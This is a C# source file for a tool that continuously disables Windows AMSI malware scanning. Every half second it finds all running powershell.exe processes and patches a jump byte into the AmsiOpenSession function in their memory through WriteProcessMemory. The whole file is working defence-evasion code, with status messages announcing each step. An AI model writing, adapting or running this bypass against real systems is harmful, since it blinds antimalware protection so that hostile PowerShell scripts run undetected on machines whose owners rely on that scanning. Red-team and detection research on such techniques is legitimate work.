using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class Program
{
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_READ = 0x0010;
    const int PROCESS_VM_WRITE = 0x0020;
    const int TH32CS_SNAPPROCESS = 0x00000002;
    const int PATCH_DELAY_MS = 500;

    static byte[] patch = new byte[] { 0xEB };

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }

    static int findpattern(byte[] buffer, byte[] pattern)
    {
        Console.WriteLine("[+] Scanning memory for AMSI Pattern!");
        int patsize = pattern.Length;
        for (int i = 0; i < buffer.Length - patsize; i++)
        {
            if (pattern[0] == '?' || buffer[i] == pattern[0])
            {
                int j = 1;
                while (j < patsize && (pattern[j] == '?' || buffer[i + j] == pattern[j]))
                    j++;
                if (j == patsize)
                {
                    Console.WriteLine($"[+] Pattern matched at buffer offset: {i}");
                    return i + 3;
                }
            }
        }
        Console.WriteLine("[-] Pattern not found!");
        return -1;
    }

    static int patchamsi(int pid)
    {
        Console.WriteLine($"[+] Patching AMSI in PID: {pid}");
        byte[] pattern = new byte[] { 0x48, (byte)'?', (byte)'?', 0x74, (byte)'?', 0x48, (byte)'?', (byte)'?', 0x74 };
        IntPtr hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, pid);
        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to open process!");
            return -1;
        }
        Console.WriteLine("[+] Opened target process handle!");
        IntPtr amsi = LoadLibrary("amsi.dll");
        Console.WriteLine($"[+] Loaded AMSI DLL: {amsi}");
        IntPtr amsiaddr = GetProcAddress(amsi, "AmsiOpenSession");
        Console.WriteLine($"[+] AmsiOpenSession Address: {amsiaddr}");
        byte[] buffer = new byte[1024];
        ReadProcessMemory(hProcess, amsiaddr, buffer, buffer.Length, out _);
        Console.WriteLine("[+] Read 1024 bytes from targetted AMSI Function!");
        int matchoffset = findpattern(buffer, pattern);
        if (matchoffset == -1)
        {
            CloseHandle(hProcess);
            Console.WriteLine("[-] Patch pattern not found, Skipping!");
            return 144;
        }
        Console.WriteLine($"[+] Calculated patch offset: {matchoffset}");
        IntPtr patchaddr = IntPtr.Add(amsiaddr, matchoffset);
        Console.WriteLine($"[+] Final patch address: {patchaddr}");
        bool result = WriteProcessMemory(hProcess, patchaddr, patch, patch.Length, out _);
        Console.WriteLine(result ? "[+] Successfully wrote patch byte." : "[-] Failed to write patch byte.");
        CloseHandle(hProcess);
        Console.WriteLine("[-] Closed process handle.");
        return result ? 0 : -1;
    }

    static void patchallpowershell()
    {
        Console.WriteLine("[+] Enumerating processes!");

        IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == IntPtr.Zero)
        {
            Console.WriteLine("[-] Failed to create process snapshot.");
            return;
        }

        PROCESSENTRY32 procEntry = new PROCESSENTRY32();
        procEntry.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));

        if (Process32First(hSnapshot, ref procEntry))
        {
            do
            {
                string procName = procEntry.szExeFile;
                if (procName.Equals("powershell.exe", StringComparison.OrdinalIgnoreCase))
                {
                    Console.WriteLine($"[+] Found powershell.exe - PID: {procEntry.th32ProcessID}");
                    int result = patchamsi((int)procEntry.th32ProcessID);

                    switch (result)
                    {
                        case 0:
                            Console.WriteLine($"[+] AMSI patched successfully in PID: {procEntry.th32ProcessID}");
                            break;
                        case 144:
                            Console.WriteLine("[-] AMSI already patched in this instance!");
                            break;
                        default:
                            Console.WriteLine("[-] Failed to patch AMSI!");
                            break;
                    }
                }
            } while (Process32Next(hSnapshot, ref procEntry));
        }

        CloseHandle(hSnapshot);
        Console.WriteLine("[+] Finished process enumeration.\n");
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    static void Main()
    {
        Console.Title = "Permenant AMSI Patch - By @MpCmdRun";
        Console.WriteLine("Permenant AMSI Patch - By @MpCmdRun");
        Console.WriteLine("[+] This is very possible to break!");
        Console.WriteLine("[+] Starting AMSI Patch loop!");
        while (true)
        {
            patchallpowershell();
            Console.WriteLine($"[+] Sleeping {PATCH_DELAY_MS} ms!\n");
            Thread.Sleep(PATCH_DELAY_MS);
        }
    }
}